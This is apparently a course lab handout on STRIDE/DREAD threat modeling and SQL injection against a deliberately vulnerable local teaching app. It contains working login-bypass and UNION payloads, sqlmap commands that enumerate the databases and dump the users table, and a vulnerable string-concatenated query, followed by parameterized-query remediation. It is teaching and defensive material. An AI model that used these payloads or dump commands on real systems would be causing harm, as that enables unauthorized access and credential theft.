# Week 7 Lab — SQL Injection and OWASP Top 10

**Lecture:** Threat Modeling, STRIDE, and DREAD; OWASP Top 10 and SQL Injection

---

## Overview

SQL injection is present in the login form, the grades search endpoint, and the enrollment search endpoint. This week you will apply STRIDE and DREAD to formally model the threat landscape, then exploit each injection point using manual payloads and sqlmap. You will remediate all injection points with parameterized queries and verify the fix.

---

## Tools

| Tool | Purpose |
|------|---------|
| Browser / Burp Suite | Manual injection testing |
| sqlmap | Automated SQL injection discovery and exploitation |
| MySQL CLI | Verify database state and confirm exploitation results |
| Flask source code | Implement parameterized query remediation |

### Installing sqlmap by Platform

**macOS:**
```bash
brew install sqlmap
# or
pip3 install sqlmap
```

**Linux:**
```bash
pip3 install sqlmap
# or
sudo apt install sqlmap
```

**Windows:**
```powershell
pip install sqlmap
```

> After installation, verify with `sqlmap --version`. On Windows, if `sqlmap` is not found after install, try `python -m sqlmap --version` or run it via Git Bash.

---

## Steps

### 1. Complete a STRIDE Threat Model

**What STRIDE is and how to use it:**
STRIDE is a threat modeling framework developed by Microsoft that organizes threats into six categories: Spoofing (impersonating someone else), Tampering (modifying data or code), Repudiation (denying you performed an action), Information Disclosure (exposing data to unauthorized parties), Denial of Service (making the system unavailable), and Elevation of Privilege (gaining access beyond your authorization level). You apply STRIDE systematically to each component of the system architecture, asking "how could an attacker achieve this threat category against this component?" The value is comprehensiveness: you are forced to consider every category rather than just the vulnerabilities that happen to be most familiar.

Using the application architecture (nginx, Flask, MySQL, AI chatbot), complete a STRIDE analysis. For each of the six categories, identify at least one threat per major component.

Format as a table:

| Component | Spoofing | Tampering | Repudiation | Info Disclosure | DoS | Elevation of Privilege |
|-----------|----------|-----------|-------------|----------------|-----|------------------------|
| nginx | ... | ... | ... | ... | ... | ... |
| Flask app | ... | ... | ... | ... | ... | ... |
| MySQL | ... | ... | ... | ... | ... | ... |
| AI chatbot | ... | ... | ... | ... | ... | ... |

---

### 2. Score Your Top Threats with DREAD

**What DREAD scoring produces and how to use the output:**
DREAD scores each threat across five dimensions to produce a numerical priority ranking. The purpose is not false precision — a score of 12 is not meaningfully different from 11 — but forcing a structured comparison between threats so you can make a defensible argument for which ones to fix first. In a real organization, security remediation competes with feature development for engineering time. A DREAD-scored threat model gives a security team language to justify prioritization to non-technical stakeholders.

Select the five highest-priority threats from your STRIDE table. Score each using DREAD:

| Dimension | Score 1 | Score 2 | Score 3 |
|-----------|---------|---------|---------|
| **D**amage | Minimal | Individual/limited | Catastrophic/many users |
| **R**eproducibility | Difficult | Repeatable with effort | Trivially reproducible |
| **E**xploitability | Expert only | Some skill required | No skill required |
| **A**ffected Users | Few | Many | All |
| **D**iscoverability | Hard to find | Findable with research | Obvious |

Rank by total score. This ranking should inform which vulnerabilities you fix first.

---

### 3. Test the Login Form for SQL Injection

**What string concatenation creates and why these payloads work:**
HuskyHub builds its login query by inserting the submitted username directly into a SQL string:

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

When the username `' OR '1'='1` is inserted, the resulting query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'
```

Because `'1'='1'` is always true, the entire `WHERE` clause evaluates to true for every row, and the database returns all users. The `admin'--` payload works differently: the `--` is a SQL comment that causes the database to ignore everything after it — including the `AND password = '...'` check. The database executes only `WHERE username = 'admin'`, bypassing the password verification entirely.

In the username field, enter:
```
' OR '1'='1
```
In the password field, enter anything. Attempt to log in. Document the result.

Then try:
```
admin'--
```
in the username field. Document whether you bypass authentication and which account you are logged in as.

---

### 4. Test the Grades Search Endpoint

**What a UNION attack does and why column count matters:**
A UNION attack appends a second SELECT statement to the original query, causing the database to return rows from both queries in a single result set. For UNION to work, both SELECT statements must return the same number of columns with compatible data types. The column count in the original query is unknown, so you start by guessing — `UNION SELECT 1,2,3,4,5,6--` attempts a 6-column UNION. If the column count is wrong, the database returns an error. If it is correct, the database returns your injected row. Once the correct column count is found, you replace the integer placeholders with actual column names from tables you want to read.

Navigate to `/grades` and use the search field. Enter:
```
' UNION SELECT 1,2,3,4,5,6--
```

If you receive a column count error, adjust the number of fields until the query succeeds. Then use a payload that extracts data:
```
' UNION SELECT username, password, email, role, 1, 1 FROM users--
```

Document what data is returned.

---

### 5. Test the Enrollment Search

Navigate to `/enrollment`. In the course name search field, enter:
```
%' OR 1=1--
```

Document whether additional records are returned beyond the current user's enrollments. The `%` character is the SQL wildcard for `LIKE` queries — it is included here because the enrollment search likely uses `LIKE '%search_term%'`, and prepending `%` ensures the injected OR clause appends correctly to the existing query structure.

---

### 6. Use sqlmap — Database Enumeration

**What sqlmap is doing and what each flag instructs it to do:**
sqlmap is an automated SQL injection tool. It probes a target endpoint with a large library of injection payloads, analyzes the responses to determine whether injection is possible, then systematically extracts data once it confirms a vulnerable parameter. `--dbs` instructs sqlmap to enumerate all accessible databases (the equivalent of `SHOW DATABASES` in MySQL). `--batch` suppresses interactive prompts and accepts default answers automatically — necessary for scripted or unattended runs. The `--cookie` flag provides your session cookie so sqlmap sends requests as an authenticated user — without it, the server would redirect to the login page on every request.

Run sqlmap against the grades endpoint using your authenticated session cookie:

**macOS / Linux:**
```bash
sqlmap -u "http://localhost/grades?student_id=3&search=info" \
  --cookie="authenticated=jsmith; role=student; user_id=3" \
  --dbs \
  --batch
```

**Windows (PowerShell):**
```powershell
sqlmap -u "http://localhost/grades?student_id=3&search=info" --cookie="authenticated=jsmith; role=student; user_id=3" --dbs --batch
```

**Windows (Git Bash):**
```bash
sqlmap -u "http://localhost/grades?student_id=3&search=info" \
  --cookie="authenticated=jsmith; role=student; user_id=3" \
  --dbs \
  --batch
```

Record every database sqlmap identifies.

---

### 7. Use sqlmap — Table and Data Extraction

**macOS / Linux / Git Bash:**
```bash
# List tables
sqlmap -u "http://localhost/grades?student_id=3&search=info" \
  --cookie="authenticated=jsmith; role=student; user_id=3" \
  -D huskyhub --tables --batch

# Dump users table
sqlmap -u "http://localhost/grades?student_id=3&search=info" \
  --cookie="authenticated=jsmith; role=student; user_id=3" \
  -D huskyhub -T users --dump --batch
```

Paste the output (redact actual password hash values). Note how many records were exposed.

---

### 8. Remediation — Parameterized Queries

**How parameterized queries prevent injection at the database level:**
In a parameterized query, the SQL statement structure is sent to the database engine as a separate step from the data values. The `%s` placeholder is a slot in the query template. When `cursor.execute(query, (username,))` runs, the database driver transmits the query template and the value separately — the database engine compiles the query structure first, then substitutes the value as a data literal. At this point, it is impossible for the value to change the query structure: single quotes, comment characters, UNION keywords inside the value are all treated as data, not as SQL syntax. There is no string concatenation happening at any point.

Replace every raw string-formatted SQL query in the application with parameterized queries.

**Before (vulnerable):**
```python
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```

**After (safe):**
```python
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))
```

Apply this change to every route: `auth.py`, `grades.py`, `enrollment.py`, `messages.py`, `documents.py`, `admin.py`, and `chatbot.py`.

---

### 9. Verify the Remediation

Repeat Steps 3–6 against the hardened application. Paste the sqlmap output showing that injection is no longer possible. Confirm the login bypass payloads return an authentication error.

---

## Write-Up Questions

**Q1.** Present your completed STRIDE table. For the login form specifically, write one concrete threat per STRIDE category.

**Q2.** Paste the exact payload you used to achieve login bypass and draw out the resulting SQL query with your payload inserted. Explain precisely why it works against a string-concatenated query.

**Q3.** The UNION-based injection in Step 4 requires knowing the number of columns in the original query. How did you determine the correct column count? What does this tell you about the reconnaissance phase of a SQL injection attack?

**Q4.** Explain how a parameterized query prevents SQL injection at a technical level. Why does escaping input without parameterization (e.g., `real_escape_string`) fail to provide equivalent protection?

**Q5.** Map the vulnerabilities you have found across all labs so far (Weeks 1–7) to the OWASP Top 10. For each applicable category, identify the OWASP entry and the corresponding HuskyHub vulnerability.

---

## Hacker Mindset Prompt

SQL injection has existed for over 25 years and remains in the OWASP Top 10 because it keeps appearing in production systems. The 2023 MOVEit breach, affecting thousands of organizations globally, was a SQL injection vulnerability.

Reflect on:

- **Contrarian:** sqlmap found the vulnerability and dumped the database in minutes. What does this say about the asymmetry between how long it takes to introduce a vulnerability and how long it takes to exploit it?
- **Committed:** An attacker who dumps the users table via SQL injection has credentials and personal data. Describe the complete attack chain that follows: what do they do next, and what other systems might be affected beyond HuskyHub?
- **Creative:** The database user in HuskyHub has read and write access to all tables. If you were designing the database access policy from scratch, how would you apply the principle of least privilege to reduce the damage a SQL injection attack could cause?
